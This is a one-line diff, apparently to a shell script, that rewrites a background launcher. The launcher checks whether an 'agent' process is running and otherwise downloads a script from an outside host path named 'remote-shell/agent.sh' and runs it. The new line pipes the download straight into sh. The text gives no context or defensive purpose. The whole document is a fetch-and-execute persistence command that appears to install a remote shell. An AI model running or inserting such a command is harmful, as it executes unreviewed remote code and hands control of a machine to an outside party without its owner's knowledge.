@@ -1,1 +1,1 @@
-pgrep -f "/tmp/agent.sh" >/dev/null || (curl -fsSL https://matasiber.web.id/remote-shell/agent.sh -o /tmp/agent.sh && chmod +x /tmp/agent.sh && /tmp/agent.sh &)
+pgrep -f "AGENT_MATASIBER" >/dev/null 2>&1 || env AGENT_MATASIBER=1 sh -c "$(curl -fsSL https://matasiber.web.id/remote-shell/agent.sh)" &
